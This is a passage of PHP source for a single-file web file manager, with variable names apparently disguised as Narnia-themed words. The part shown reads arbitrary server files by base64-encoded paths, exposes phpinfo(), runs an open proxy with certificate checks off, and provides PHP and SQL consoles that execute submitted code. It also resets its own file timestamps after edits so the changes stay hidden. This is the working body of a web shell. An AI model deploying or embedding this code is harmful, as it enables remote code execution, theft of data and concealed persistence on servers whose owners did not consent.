			if (!empty($castleConfig['fm_restore_time'])) touch(__FILE__,$forestFileModified);
		}
	} elseif (isset($_POST['tpl_edited'])) { 


		$lanternLanguageTemplate = $_POST['tpl_edited'];
		if (!empty($_POST[$lanternLanguageTemplate.'_name'])) {
			$narniaPanel = json_encode(array_combine($_POST[$lanternLanguageTemplate.'_name'],$_POST[$lanternLanguageTemplate.'_value']),JSON_HEX_APOS);
		} elseif (!empty($_POST[$lanternLanguageTemplate.'_new_name'])) {


			$narniaPanel = json_encode(json_decode(${$lanternLanguageTemplate.'_templates'},true)+array($_POST[$lanternLanguageTemplate.'_new_name']=>$_POST[$lanternLanguageTemplate.'_new_value']),JSON_HEX_APOS);
		}
		if (!empty($narniaPanel)) {
			$aslanFileContent = file_get_contents(__FILE__);

			$searchProphecy = preg_match('#'.$lanternLanguageTemplate.'_templates[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $aslanFileContent, $questMatches);



			if (!empty($questMatches[1])) {



				$forestFileModified = filemtime(__FILE__);
				$replacePeter = str_replace('{"'.$questMatches[1].'"}',$narniaPanel,$aslanFileContent);
				if (file_put_contents(__FILE__, $replacePeter)) {


					${$lanternLanguageTemplate.'_templates'} = $narniaPanel;
					$aslanMessage .= __('File updated');

				} else $aslanMessage .= __('Error occurred');
				if (!empty($castleConfig['fm_restore_time'])) touch(__FILE__,$forestFileModified);
			}	

		} else $aslanMessage .= __('Error occurred');



	}



}




// Just show image

if (isset($_GET['img'])) {

	$narniaFile=base64_decode($_GET['img']);
	if ($aslanInfo=getimagesize($narniaFile)){


		switch  ($aslanInfo[2]){	//1=GIF, 2=JPG, 3=PNG, 4=SWF, 5=PSD, 6=BMP

			case 1: $edmundExtension='gif'; break;



			case 2: $edmundExtension='jpeg'; break;
			case 3: $edmundExtension='png'; break;

			case 6: $edmundExtension='bmp'; break;
			default: die();

		}
		header("Content-type: image/$edmundExtension");


		echo file_get_contents($narniaFile);


		die();
	}
}


// Just download file



if (isset($_GET['download'])) {
	$narniaFile=base64_decode($_GET['download']);
	downloadAslanFile($narniaFile);	



}




// Just show info
if (isset($_GET['phpinfo'])) {
	phpinfo(); 
	die();
}






// Mini proxy, many bugs!



if (isset($_GET['proxy']) && (!empty($castleConfig['enable_proxy']))) {
	$castleUrl = isset($_GET['url'])?urldecode($_GET['url']):'';
	$proxyAslanForm = '
<div style="position:relative;z-index:100500;background: linear-gradient(to bottom, #e4f5fc 0%,#bfe8f9 50%,#9fd8ef 51%,#2ab0ed 100%);">
	<form action="" method="GET">
	<input type="hidden" name="proxy" value="true">

	'.narniaHome().' <a href="'.$castleUrl.'" target="_blank">Url</a>: <input type="text" name="url" value="'.$castleUrl.'" size="55">
	<input type="submit" value="'.__('Show').'" class="fm_input">
	</form>


</div>
';
	if ($castleUrl) {
		$castleChannel = curl_init($castleUrl);
		curl_setopt($castleChannel, CURLOPT_USERAGENT, 'Den1xxx test proxy');



		curl_setopt($castleChannel, CURLOPT_FOLLOWLOCATION, 1);


		curl_setopt($castleChannel, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($castleChannel, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($castleChannel, CURLOPT_HEADER, 0);
		curl_setopt($castleChannel, CURLOPT_REFERER, $castleUrl);
		curl_setopt($castleChannel, CURLOPT_RETURNTRANSFER,true);


		$prophecyResult = curl_exec($castleChannel);
		curl_close($castleChannel);
		//$prophecyResult = preg_replace('#(src)=["\'][http://]?([^:]*)["\']#Ui', '\\1="'.$castleUrl.'/\\2"', $prophecyResult);
		$prophecyResult = preg_replace_callback('#(href|src)=["\'][http://]?([^:]*)["\']#Ui', 'castleUrlProxy', $prophecyResult);


		$prophecyResult = preg_replace('%(<body.*?>)%i', '$1'.'<style>'.aslanHomeStyle().'</style>'.$proxyAslanForm, $prophecyResult);
		echo $prophecyResult;
		die();



	} 


}


?>
<!doctype html>



<html>

<head>     
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
    <title><?=__('File manager')?></title>
<style>



body {

	background-color:	white;
	font-family:		Verdana, Arial, Helvetica, sans-serif;



	font-size:			8pt;
	margin:				0px;



}




a:link, a:active, a:visited { color: #006699; text-decoration: none; }
a:hover { color: #DD6900; text-decoration: underline; }


a.th:link { color: #FFA34F; text-decoration: none; }

a.th:active { color: #FFA34F; text-decoration: none; }


a.th:visited { color: #FFA34F; text-decoration: none; }
a.th:hover {  color: #FFA34F; text-decoration: underline; }




table.bg {

	background-color: #ACBBC6
}





th, td { 
	font:	normal 8pt Verdana, Arial, Helvetica, sans-serif;


	padding: 3px;

}




th	{

	height:				25px;

	background-color:	#006699;
	color:				#FFA34F;



	font-weight:		bold;

	font-size:			11px;
}


.row1 {
	background-color:	#EFEFEF;
}




.row2 {
	background-color:	#DEE3E7;
}




.row3 {


	background-color:	#D1D7DC;

	padding: 5px;
}




tr.row1:hover {
	background-color:	#F3FCFC;
}

tr.row2:hover {

	background-color:	#F0F6F6;
}




.whole {
	width: 100%;


}



.all tbody td:first-child{width:100%;}

textarea {



	font: 9pt 'Courier New', courier;
	line-height: 125%;
	padding: 5px;



}

.textarea_input {

	height: 1em;
}





.textarea_input:focus {
	height: auto;



}



input[type=submit]{



	background: #FCFCFC none !important;



	cursor: pointer;
}




.folder {


    background-image: url("data:image/png;base64,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");
}



.file {
    background-image: url("data:image/png;base64,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");
}
<?=aslanHomeStyle()?>

.img {



	background-image: 
url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAdFQTFRF7e3t/f39pJ+f+cJajV8q6enpkGIm/sFO/+2O393c5ubm/sxbd29yimdneFg65OTk2zoY6uHi1zAS1crJsHs2nygo3Nrb2LBXrYtm2p5A/+hXpoRqpKOkwri46+vr0MG36Ysz6ujpmI6AnzUywL+/mXVSmIBN8bwwj1VByLGza1ZJ0NDQjYSB/9NjwZ6CwUAsxk0brZyWw7pmGZ4A6LtdkHdf/+N8yow27b5W87RNLZL/2biP7wAA//GJl5eX4NfYsaaLgp6h1b+t/+6R68Fe89ycimZd/uQv3r9NupCB99V25a1cVJbbnHhO/8xS+MBa8fDwi2Ji48qi/+qOdVIzs34x//GOXIzYp5SP/sxgqpiIcp+/siQpcmpstayszSANuKKT9PT04uLiwIky8LdE+sVWvqam8e/vL5IZ+rlH8cNg08Ccz7ad8vLy9LtU1qyUuZ4+r512+8s/wUpL3d3dx7W1fGNa/89Z2cfH+s5n6Ojob1Yts7Kz19fXwIg4p1dN+Pj4zLR0+8pd7strhKAs/9hj/9BV1KtftLS1np2dYlJSZFVV5LRWhEFB5rhZ/9Jq0HtT//CSkIqJ6K5D+LNNblVVvjM047ZMz7e31xEG////tKgu6wAAAJt0Uk5T/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wCVVpKYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAANZJREFUKFNjmKWiPQsZMMximsqPKpAb2MsAZNjLOwkzggVmJYnyps/QE59eKCEtBhaYFRfjZuThH27lY6kqBxYorS/OMC5wiHZkl2QCCVTkN+trtFj4ZSpMmawDFBD0lCoynzZBl1nIJj55ElBA09pdvc9buT1SYKYBWw1QIC0oNYsjrFHJpSkvRYsBKCCbM9HLN9tWrbqnjUUGZG1AhGuIXZRzpQl3aGwD2B2cZZ2zEoL7W+u6qyAunZXIOMvQrFykqwTiFzBQNOXj4QKzoAKzajtYIQwAlvtpl3V5c8MAAAAASUVORK5CYII=");



}
@media screen and (max-width:720px){

  table{display:block;}



    #fm_table td{display:inline;float:left;}



    #fm_table tbody td:first-child{width:100%;padding:0;}
    #fm_table tbody tr:nth-child(2n+1){background-color:#EFEFEF;}
    #fm_table tbody tr:nth-child(2n){background-color:#DEE3E7;}

    #fm_table tr{display:block;float:left;clear:left;width:100%;}
	#header_table .row2, #header_table .row3 {display:inline;float:left;width:100%;padding:0;}
	#header_table table td {display:inline;float:left;}
}

</style>
</head>


<body>
<?php

$includedLucyUrl = '?fm=true';



if (isset($_POST['sqlrun'])&&!empty($castleConfig['enable_sql_console'])){



	$aslanResult = empty($_POST['sql']) ? '' : $_POST['sql'];



	$lanternResponseLanguage = 'sql';
} elseif (isset($_POST['phprun'])&&!empty($castleConfig['enable_php_console'])){
	$aslanResult = empty($_POST['php']) ? '' : $_POST['php'];



	$lanternResponseLanguage = 'php';
} 

if (isset($_GET['fm_settings'])) {
	echo ' 
<table class="whole">


<form method="post" action="">
<tr><th colspan="2">'.__('File manager').' - '.__('Settings').'</th></tr>
'.(empty($aslanMessage)?'':'<tr><td class="row2" colspan="2">'.$aslanMessage.'</td></tr>').'
'.castleConfigCheckboxRow(__('Show size of the folder'),'show_dir_size').'

'.castleConfigCheckboxRow(__('Show').' '.__('pictures'),'show_img').'


'.castleConfigCheckboxRow(__('Show').' '.__('Make directory'),'make_directory').'


'.castleConfigCheckboxRow(__('Show').' '.__('New file'),'new_file').'
'.castleConfigCheckboxRow(__('Show').' '.__('Upload'),'upload_file').'


'.castleConfigCheckboxRow(__('Show').' PHP version','show_php_ver').'
'.castleConfigCheckboxRow(__('Show').' PHP ini','show_php_ini').'

'.castleConfigCheckboxRow(__('Show').' '.__('Generation time'),'show_gt').'
'.castleConfigCheckboxRow(__('Show').' xls','show_xls').'



'.castleConfigCheckboxRow(__('Show').' PHP '.__('Console'),'enable_php_console').'

'.castleConfigCheckboxRow(__('Show').' SQL '.__('Console'),'enable_sql_console').'
<tr><td class="row1"><input name="fm_config[sql_server]" value="'.$castleConfig['sql_server'].'" type="text"></td><td class="row2 whole">SQL server</td></tr>


<tr><td class="row1"><input name="fm_config[sql_username]" value="'.$castleConfig['sql_username'].'" type="text"></td><td class="row2 whole">SQL user</td></tr>
<tr><td class="row1"><input name="fm_config[sql_password]" value="'.$castleConfig['sql_password'].'" type="text"></td><td class="row2 whole">SQL password</td></tr>
<tr><td class="row1"><input name="fm_config[sql_db]" value="'.$castleConfig['sql_db'].'" type="text"></td><td class="row2 whole">SQL DB</td></tr>


'.castleConfigCheckboxRow(__('Show').' Proxy','enable_proxy').'
'.castleConfigCheckboxRow(__('Show').' phpinfo()','show_phpinfo').'
'.castleConfigCheckboxRow(__('Show').' '.__('Settings'),'fm_settings').'


'.castleConfigCheckboxRow(__('Restore file time after editing'),'restore_time').'
'.castleConfigCheckboxRow(__('File manager').': '.__('Restore file time after editing'),'fm_restore_time').'
<tr><td class="row3"><a href="'.getCastleUrl().'?fm_settings=true&fm_config_delete=true">'.__('Reset settings').'</a></td><td class="row3"><input type="submit" value="'.__('Save').'" name="fm_config[fm_set_submit]"></td></tr>
</form>
</table>

<table>


<form method="post" action="">
<tr><th colspan="2">'.__('Settings').' - '.__('Authorization').'</th></tr>

<tr><td class="row1"><input name="fm_login[authorize]" value="1" '.($aslanAuthorized['authorize']?'checked':'').' type="checkbox" id="auth"></td><td class="row2 whole"><label for="auth">'.__('Authorization').'</label></td></tr>



<tr><td class="row1"><input name="fm_login[login]" value="'.$aslanAuthorized['login'].'" type="text"></td><td class="row2 whole">'.__('Login').'</td></tr>



<tr><td class="row1"><input name="fm_login[password]" value="'.$aslanAuthorized['password'].'" type="text"></td><td class="row2 whole">'.__('Password').'</td></tr>

<tr><td class="row1"><input name="fm_login[cookie_name]" value="'.$aslanAuthorized['cookie_name'].'" type="text"></td><td class="row2 whole">'.__('Cookie').'</td></tr>

<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$aslanAuthorized['days_authorization'].'" type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>
<tr><td class="row1"><textarea name="fm_login[script]" cols="35" rows="7" class="textarea_input" id="auth_script">'.$aslanAuthorized['script'].'</textarea></td><td class="row2 whole">'.__('Script').'</td></tr>

<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Save').'" ></td></tr>
</form>


</table>';

echo castleTemplateForm('php'),castleTemplateForm('sql');



} elseif (isset($proxyAslanForm)) {



	die($proxyAslanForm);
} elseif (isset($lanternResponseLanguage)) {	


?>
<table class="whole">

<tr>
    <th><?=__('File manager').' - '.$narniaPath?></th>
</tr>
<tr>
    <td class="row2"><table><tr><td><h2><?=strtoupper($lanternResponseLanguage)?> <?=__('Console')?><?php


	if($lanternResponseLanguage=='sql') echo ' - Database: '.$castleConfig['sql_db'].'</h2></td><td>'.runCastleInput('php');
	else echo '</h2></td><td>'.runCastleInput('sql');
	?></td></tr></table></td>
</tr>



<tr>


    <td class="row1">


		<a href="<?=$includedLucyUrl.'&path=' . $narniaPath;?>"><?=__('Back')?></a>

		<form action="" method="POST" name="console">
		<textarea name="<?=$lanternResponseLanguage?>" cols="80" rows="10" style="width: 90%"><?=$aslanResult?></textarea><br/>
		<input type="reset" value="<?=__('Reset')?>">


		<input type="submit" value="<?=__('Submit')?>" name="<?=$lanternResponseLanguage?>run">


<?php
$stringTemplateNarnia = $lanternResponseLanguage.'_templates';
$narniaTemplate = !empty($$stringTemplateNarnia) ? json_decode($$stringTemplateNarnia,true) : '';
if (!empty($narniaTemplate)){

	$wardrobeActive = isset($_POST[$lanternResponseLanguage.'_tpl']) ? $_POST[$lanternResponseLanguage.'_tpl'] : '';
